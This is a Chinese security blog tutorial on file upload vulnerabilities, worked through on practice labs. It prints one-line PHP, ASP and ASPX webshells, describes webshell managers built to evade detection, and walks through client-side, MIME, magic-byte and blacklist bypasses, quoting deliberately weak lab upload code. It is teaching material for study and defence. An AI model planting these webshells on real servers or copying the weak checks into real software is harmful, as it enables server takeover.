<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>浅谈文件上传文件上传漏洞 | 逸晨のBlog</title><meta name="keywords" content="WEB安全,文件上传"><meta name="author" content="逸晨"><meta name="copyright" content="逸晨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件上传漏洞简介文件上传漏洞原理大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。 这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。 文">
<meta property="og:type" content="article">
<meta property="og:title" content="浅谈文件上传文件上传漏洞">
<meta property="og:url" content="https://blog.yichen.cf/2022/03/10/%E6%B5%85%E8%B0%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="逸晨のBlog">
<meta property="og:description" content="文件上传漏洞简介文件上传漏洞原理大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。 这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。 文">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://r8ilupnbg.bkt.clouddn.com/v2-91b3ddf62987c7a077eed785acd90545_1440w.jpg">
<meta property="article:published_time" content="2022-03-10T02:54:12.364Z">
<meta property="article:modified_time" content="2022-03-10T05:57:55.050Z">
<meta property="article:author" content="逸晨">
<meta property="article:tag" content="WEB安全">
<meta property="article:tag" content="文件上传">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://r8ilupnbg.bkt.clouddn.com/v2-91b3ddf62987c7a077eed785acd90545_1440w.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://blog.yichen.cf/2022/03/10/%E6%B5%85%E8%B0%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '浅谈文件上传文件上传漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-10 13:57:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiperstyle.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逸晨のBlog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">浅谈文件上传文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-10T02:54:12.364Z" title="发表于 2022-03-10 10:54:12">2022-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-10T05:57:55.050Z" title="更新于 2022-03-10 13:57:55">2022-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E5%AE%89/">信安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="浅谈文件上传文件上传漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h1><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h2><p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。</p>
<p>这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p>
<h2 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h2><ol>
<li>上传恶意脚本文件到服务器中，通过访问该恶意文件从而执行文件中的恶意代码；</li>
<li>攻击者可利用目录跳转上传php、config等文件，覆盖原有的系统文件，到达篡改系统文件、甚至获取系统权限的目的；</li>
<li>攻击者可上传html、shtm等文件，并写入非法博彩、赌博等恶意SEO页面或者写入恶意js文件进行钓鱼来非法获取用户信息等；</li>
</ol>
<h2 id="漏洞比较容易产生的位置"><a href="#漏洞比较容易产生的位置" class="headerlink" title="漏洞比较容易产生的位置"></a>漏洞比较容易产生的位置</h2><p>文件上传漏洞通常发生在业务系统需要进行上传文件等功能处，比如上传图片、视频、文档；发表文章、评论；意见反馈；个人信息中的头像，照片，附件等。</p>
<h1 id="文件上传漏洞工具以及相关利用脚本介绍"><a href="#文件上传漏洞工具以及相关利用脚本介绍" class="headerlink" title="文件上传漏洞工具以及相关利用脚本介绍"></a>文件上传漏洞工具以及相关利用脚本介绍</h1><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
</blockquote>
<p>顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。</p>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>对于不同的语言有不同的构造方法。</p>
<ul>
<li>基本构造：最开头构造的是脚本开始的标记</li>
<li>核心部分：获取并执行得到的内容，通常类似<code>eval</code>、<code>execute</code>等</li>
<li>被执行内容：一般是http等协议接受的值，通常类似<code>request、$_POST</code>等</li>
</ul>
<p>如果我们通过客户端向服务器发送被执行内容，那么就会让服务器执行我们发送的脚本，挂马就实现了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/*asp一句话木马*/`</span><br><span class="line">&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line"></span><br><span class="line">/*php一句话木马*/</span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line"></span><br><span class="line">/*aspx一句话木马*/</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>

<p>黑帽子的目的，就是想尽办法给目标网站插入这么一段会被储存起来的语句。可以是一个单独的脚本文件文件（.asp 、.php、.aspx、.jsp ），或者是隐藏在某些网页下的文件、代码等。其中的value 就是客户端要发送的内容，然后通过客户端与服务器建立连接，发送控制脚本。也会涉及到一些任意文件上传漏洞等。</p>
<h3 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h3><ul>
<li>体积小，功能少</li>
<li>一般只有一个上传功能，用于上传大马</li>
</ul>
<h3 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h3><ul>
<li>体积大，功能全</li>
<li>会调用系统关键函数</li>
<li>以代码加密进行隐藏</li>
</ul>
<h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><h3 id="中国菜刀（Chopper）"><a href="#中国菜刀（Chopper）" class="headerlink" title="中国菜刀（Chopper）"></a>中国菜刀（Chopper）</h3><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310111856.png"></p>
<h3 id="蚁剑（AntSword）"><a href="#蚁剑（AntSword）" class="headerlink" title="蚁剑（AntSword）"></a>蚁剑（AntSword）</h3><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！使用编&#x2F;解码器进行流量混淆可绕过WAF，并且有多款实用插件。</p>
<p><strong>项目地址：</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310111926.png"></p>
<h3 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h3><p>冰蝎是一款基于Java开发的动态二进制加密通信流量的新型Webshell客户端，由于它的通信流量被加密，使用传统的WAF、IDS等设备难以检测，目前在HVV中使用较多的一款工具。</p>
<p><strong>项目地址：</strong></p>
<p>•<a target="_blank" rel="noopener" href="http://github.com/rebeyond/Behinder">http://github.com/rebeyond/Behinder</a></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310111945.png"></p>
<h3 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h3><p>哥斯拉是一款继冰蝎之后又一款于Java开发的加密通信流量的新型Webshell客户端，内置了3种有效载荷以及6种加密器，6种支持脚本后缀，20个内置插件，也是目前在HVV中使用较多的一款工具。</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310111957.png"></p>
<h1 id="文件上传漏洞利用姿势"><a href="#文件上传漏洞利用姿势" class="headerlink" title="文件上传漏洞利用姿势"></a>文件上传漏洞利用姿势</h1><h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名</p>
<pre><code>通常可以根据它的验证警告弹框的速度可以判断，如果你电脑运行比较快，那么我们可以用burp抓包，在点击提交的时候burp没
</code></pre>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>关闭前端js校验，可以通过更改浏览器的配置文件。</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112021.png"></p>
<h3 id="参考案例（Upload-Lab-Pass-01）"><a href="#参考案例（Upload-Lab-Pass-01）" class="headerlink" title="参考案例（Upload_Lab_Pass_01）"></a>参考案例（Upload_Lab_Pass_01）</h3><p>因为网站弹出js文件较快，判断为js检测，并没有进行HTTP请求去访问服务器，也就是说目前只在前端进行一个绕过</p>
<h4 id="绕过方法1"><a href="#绕过方法1" class="headerlink" title="绕过方法1"></a>绕过方法1</h4><p>关闭js，相当于直接绕过了js直接对文件进行了上传，这边直接使用了谷歌的scriptblock工具</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112029.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112039.png"></p>
<h4 id="绕过方法2"><a href="#绕过方法2" class="headerlink" title="绕过方法2"></a>绕过方法2</h4><p>使用burpshite抓包，修改文件名后缀</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112049.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112104.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112116.png"></p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;code <span class="class"><span class="keyword">class</span>=&quot;<span class="title">line</span>-<span class="title">numbers</span> <span class="title">language</span>-<span class="title">javascript</span>&quot;&gt;<span class="title">function</span> <span class="title">checkFile</span>() </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;input <span class="class"><span class="keyword">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;其中的<span class="title">upload</span>对应<span class="title">js</span>中<span class="title">document</span>.<span class="title">getElementsByName</span>(&#x27;<span class="title">upload_file</span>&#x27;)[0].<span class="title">value</span>参数</span></span><br><span class="line"><span class="class">对<span class="title">file</span>进行传参，接下来是一个对<span class="title">file</span>值的判断，查看是否有参数传入</span></span><br><span class="line"><span class="class">如果<span class="title">file</span>=<span class="title">null</span> 或者 <span class="title">file</span>=&quot;&quot;也就是说没有东西上传</span></span><br><span class="line"><span class="class">//定义允许上传的文件类型</span></span><br><span class="line"><span class="class"><span class="title">var</span> <span class="title">allow_ext</span> = &quot;.<span class="title">jpg</span>|.<span class="title">png</span>|.<span class="title">gif</span>&quot;;</span></span><br><span class="line"><span class="class"><span class="title">var</span> <span class="title">ext_name</span> = <span class="title">file</span>.<span class="title">substring</span>(<span class="title">file</span>.<span class="title">lastIndexOf</span>(&quot;.&quot;));</span></span><br><span class="line"><span class="class">//提取上传文件的类型</span></span><br><span class="line"><span class="class">//<span class="title">lastIndexOf</span>() 方法可返回一个指定的字符串值最后出现的位置，在一个字符串中的指定位置从后向前搜索。</span></span><br><span class="line"><span class="class">//<span class="title">substring</span>() 方法用于提取字符串中介于两个指定下标之间的字符。</span></span><br><span class="line"><span class="class">//两个合用就是，先用<span class="title">lastIndexOF</span>读取.以后的起始位置，比如<span class="title">shell</span>.<span class="title">php</span> 那么<span class="title">lastIndexOf</span>就是返回5</span></span><br><span class="line"><span class="class">//在用<span class="title">substring</span>读取从5开始的字符，也就是.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>



<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。它在<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc6838">IETF RFC 6838</a>中进行了定义和标准化。</p>
<p><strong>重要：</strong>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型列表</a></p>
<p>_独立_类型表明了对文件的分类，可以是如下之一：</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>描述</strong></th>
<th><strong>典型示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>表明文件是普通文本，理论上是人类可读</td>
<td>text&#x2F;plain, text&#x2F;html, text&#x2F;css, text&#x2F;javascript</td>
</tr>
<tr>
<td>image</td>
<td>表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型</td>
<td>image&#x2F;gif, image&#x2F;png, image&#x2F;jpeg, image&#x2F;bmp, image&#x2F;webp, image&#x2F;x-icon, image&#x2F;vnd.microsoft.icon</td>
</tr>
</tbody></table>
<h4 id="参考案例（Upload-Lab-Pass-02）"><a href="#参考案例（Upload-Lab-Pass-02）" class="headerlink" title="参考案例（Upload_Lab_Pass_02）"></a>参考案例（Upload_Lab_Pass_02）</h4><h5 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h5><p><img src="http://img.yichen.cf/learning_upload/20220310112132.png"></p>
<p>使用Burp截取上传数据包，修改Content-Type的值，改为image&#x2F;gif即可成功绕过上传webshell</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112141.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112153.png"></p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>以上是一个简单的服务器上传验证代码，只要content-type符合image&#x2F;gif就允许上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>即文件头检测，主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下：</p>
<p>JPG文件：Value &#x3D; FF D8 FF E0 00 10 4A 46 49 46</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112204.png"></p>
<p>PNG文件：Value &#x3D; 89 50 4E 47</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112215.png"></p>
<p>GIF文件：Value &#x3D; 47 49 46 38 39 61</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112304.png"></p>
<h4 id="参考案例"><a href="#参考案例" class="headerlink" title="参考案例"></a>参考案例</h4><p>东塔靶场<a target="_blank" rel="noopener" href="https://labs.do-ta.com/index/course/detail/id/14">文件上传之文件头绕过 (do-ta.com)</a></p>
<p>增加文件头gif即可</p>
<p><img src="http://img.yichen.cf/upload_chshi/vulntarget-b-20220202210919.png#crop=0&crop=0&crop=1&crop=1&id=keXfb&originHeight=522&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><img src="http://img.yichen.cf/upload_chshi/20220202211159.png#crop=0&crop=0&crop=1&crop=1&id=bQiRQ&originHeight=530&originWidth=707&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h3 id="黑名单校验"><a href="#黑名单校验" class="headerlink" title="黑名单校验"></a>黑名单校验</h3><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><h5 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h5><p>网站在后台的代码中，要是遇见上传的文件后缀名在黑名单中，就将后缀名变为空，则我们可以通过双写后缀名来绕过，例如test.pphphp</p>
<h5 id="参考案例（Upload-Lab-Pass-10"><a href="#参考案例（Upload-Lab-Pass-10" class="headerlink" title="参考案例（Upload_Lab_Pass_10)"></a>参考案例（Upload_Lab_Pass_10)</h5><p>上传shell2.php返回，说明php奖php进行了替换，替换成了空</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112344.png"></p>
<p>直接上传双写的php，通过下图抓包中得知，已经成功绕过</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112435.png"></p>
<h6 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h6><p>直接利用<code>str_ireplace</code>函数进行替换，如果filename&#x3D;deny_ext中的内容，直接替换为空，也就是说上传.pphphp文件会变成.php</p>
